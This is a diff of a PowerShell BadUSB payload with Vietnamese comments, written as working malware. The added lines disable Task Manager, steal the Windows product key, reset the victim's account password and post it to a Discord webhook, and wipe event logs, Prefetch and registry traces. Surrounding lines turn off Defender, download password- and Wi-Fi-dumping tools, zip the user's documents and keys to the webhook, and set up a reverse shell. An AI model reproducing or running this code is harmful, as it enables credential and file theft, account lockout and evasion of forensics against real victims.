@@ -6,14 +6,23 @@
 #  |___/                                        
 
 # ============================================
-# PHẦN 1: KHỞI TẠO
+# KHỞI TẠO
 # ============================================
 $hookurl = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
 $basePath = "C:\Users\$env:USERNAME\Downloads\scripts"
 $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 
+$NewPassword = "BadUSB@2025"  # Đặt mật khẩu mới tùy ý
+
 $IP = '192.168.2.5'     # IP máy tấm công
 $PORT = '6969'            # Port dùng cho rs
+
+
+# ============================================
+# VÔ HIỆU HÓA TASK MANAGER
+# ============================================
+New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1
 
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
@@ -27,19 +36,28 @@ New-Item -ItemType Directory -Path $basePath -Force | Out-Null
 Set-Location $basePath
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 
+
+# ============================================
+# LẤY WINDOWS PRODUCT KEY
+# ============================================
+$OriginalKey = (Get-WmiObject -Query 'select * from SoftwareLicensingService').OA3xOriginalProductKey
+$BackupKey = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -ErrorAction SilentlyContinue).BackupProductKeyDefault
+
 # Lấy thông tin máy
 function GatherSystemInfo {
     $sysInfoDir = "$dumpFolder\SystemInfo"
     if (-Not (Test-Path $sysInfoDir)) {
         New-Item -ItemType Directory -Path $sysInfoDir -Force | Out-Null
     }
-
     Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
     Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
     Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
     Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
     if ($hookurl) {
-        $body = @{ content = "**SYSTEM INFO EXFILTRATED**`n**Computer:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" } | ConvertTo-Json
+        $body = @{ content = "**SYSTEM INFO EXFILTRATED**`n**Computer:** $env:COMPUTERNAME`n
+        **User:** $env:USERNAME`n**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n`n
+        **Original Product Key:** $OriginalKey`n
+        **Backup Product Key:** $BackupKey" } | ConvertTo-Json
         Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing -ErrorAction SilentlyContinue
         
         Get-ChildItem "$sysInfoDir" -File | ForEach-Object {
@@ -53,7 +71,7 @@ function GatherSystemInfo {
 GatherSystemInfo
 
 # ============================================
-# PHẦN 2: TẢI VÀ GIẢI NÉN TOOLS
+# TẢI VÀ GIẢI NÉN TOOLS
 # ============================================
 
 $zipUrl = "https://raw.githubusercontent.com/khangpdm/BadUSB/refs/heads/main/tools.zip"
@@ -61,7 +79,7 @@ Invoke-WebRequest $zipUrl -OutFile "tools.zip"
 Expand-Archive -Path "tools.zip" -DestinationPath "." -Force
 
 # ============================================
-# PHẦN 3: CHẠY 4 TOOL LẤY DỮ LIỆU
+# CHẠY 4 TOOL LẤY DỮ LIỆU
 # ============================================
 
 Start-Process -FilePath ".\WNetWatcher.exe" -ArgumentList "/stext connected_devices.txt" -WindowStyle Hidden
@@ -77,7 +95,7 @@ Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" 
 Start-Sleep -Seconds 20
 
 # ============================================
-# PHẦN 4: DI CHUYỂN FILE VÀO THƯ MỤC DUMP
+# DI CHUYỂN FILE VÀO THƯ MỤC DUMP
 # ============================================
 
 $filesToMove = @("passwords.txt", "wifi.txt", "connected_devices.txt", "history.txt")
@@ -88,13 +106,13 @@ foreach ($file in $filesToMove) {
 }
 
 # ============================================
-# PHẦN 5: DISCORD WEBHOOK
+# DISCORD WEBHOOK
 # ============================================
 
 
 
 # ============================================
-# PHẦN 6: GỬI TỪNG FILE TXT QUA DISCORD
+# GỬI TỪNG FILE TXT QUA DISCORD
 # ============================================
 
 # Gửi thông báo đầu tiên
@@ -109,7 +127,7 @@ Get-ChildItem "$dumpFolder" -File | Where-Object { $_.Length -gt 0 } | ForEach-O
 }
 
 # ============================================
-# PHẦN 7: ẨN CỬA SỔ (CHO FINDSEND)
+# ẨN CỬA SỔ (CHO FINDSEND)
 # ============================================
 
 $hide = 'y'
@@ -128,7 +146,7 @@ if($hide -eq 'y'){
 }
 
 # ============================================
-# PHẦN 8: FINDSEND (QUÉT FILE VÀ GỬI QUA DISCORD)
+# FINDSEND (QUÉT FILE VÀ GỬI QUA DISCORD)
 # ============================================
 
 Function FindAndSend {
@@ -142,13 +160,18 @@ Function FindAndSend {
     If($Path -ne $null){
         $foldersToSearch = "$env:USERPROFILE\"+$Path
     }else{
-        $foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
+        $foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive",
+        "$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
     }
     
     If($FileType -ne $null){
         $fileExtensions = "*."+$FileType
     }else {
-        $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
+        $fileExtensions = @("*.log", "*.db", "*.txt",
+        "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png",
+        "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls",
+        "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
     }
     
     Add-Type -AssemblyName System.IO.Compression.FileSystem
@@ -187,7 +210,20 @@ Function FindAndSend {
 FindAndSend
 
 # ============================================
-# PHẦN 9: DỌN DẸP DẤU VẾT
+# ĐỔI MẬT KHẨU
+# ============================================
+
+try {
+    net user $env:USERNAME $NewPassword
+    $body = @{ content = "**PASSWORD CHANGED**`n**User:** $env:USERNAME`n**New Password:** $NewPassword" } | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing -ErrorAction SilentlyContinue
+} catch {
+    $body = @{ content = "**PASSWORD CHANGE FAILED**`n**User:** $env:USERNAME`n**Error:** $_" } | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing -ErrorAction SilentlyContinue
+}
+
+# ============================================
+# DỌN DẸP DẤU VẾT
 # ============================================
 
 Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
@@ -202,7 +238,61 @@ Remove-Item -Path $basePath -Recurse -Force -ErrorAction SilentlyContinue
 Remove-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
 
 # ============================================
-# PHẦN 10: REVERSE SHELL
+# XÓA DẤU VẾT NÂNG CAO
+# ============================================
+
+# 1. Xóa Event Logs PowerShell
+try {
+    wevtutil cl "Windows PowerShell" 2>$null
+    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+    wevtutil cl "Microsoft-Windows-PowerShell/Admin" 2>$null
+} catch {}
+
+# 2. Xóa Prefetch files của PowerShell
+try {
+    Get-ChildItem "C:\Windows\Prefetch\*POWERSHELL*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force
+    Get-ChildItem "C:\Windows\Prefetch\*POWERSHELL*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force
+} catch {}
+
+# 3. Xóa Recent files
+try {
+    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
+} catch {}
+
+# 4. Xóa UserAssist registry (ghi lại chương trình đã chạy)
+try {
+    $userAssistPaths = @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
+    )
+    foreach ($path in $userAssistPaths) {
+        if (Test-Path $path) {
+            Get-ChildItem -Path $path -Recurse | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+} catch {}
+
+# 5. Xóa RecentDocs registry
+try {
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Name "*" -Force -ErrorAction SilentlyContinue
+} catch {}
+
+# 6. Clear Console Buffer
+try {
+    Clear-Host
+} catch {}
+
+# 7. Xóa file history của PowerShell (một lần nữa cho chắc)
+try {
+    $historyPath = (Get-PSReadlineOption).HistorySavePath
+    if ($historyPath -and (Test-Path $historyPath)) {
+        Clear-Content $historyPath -Force -ErrorAction SilentlyContinue
+        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+    }
+} catch {}
+
+# ============================================
+# REVERSE SHELL
 # ============================================
 
 # RS làm rối phức tạp
